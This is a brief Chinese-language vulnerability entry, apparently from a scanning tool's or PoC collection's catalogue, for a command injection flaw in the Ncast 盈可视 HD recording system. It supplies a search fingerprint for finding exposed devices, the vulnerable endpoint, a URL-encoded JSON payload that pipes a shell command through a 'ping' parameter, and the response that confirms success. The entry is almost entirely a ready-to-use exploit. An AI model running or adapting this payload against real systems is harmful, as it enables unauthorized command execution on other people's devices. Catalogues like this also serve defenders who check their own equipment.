# Ncast盈可视高清智能录播系统busiFacadeRCE漏洞

Ncast ｜ 命令执行 ｜ —
- **指纹**：`app="Ncast-产品"`
- **请求**：`POST /classes/common/busiFacade.php HTTP/1.1`

**Payload**
```
%7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20echo%20dudesuite%22%5D%7D
```
- **响应特征**：200 dudesuite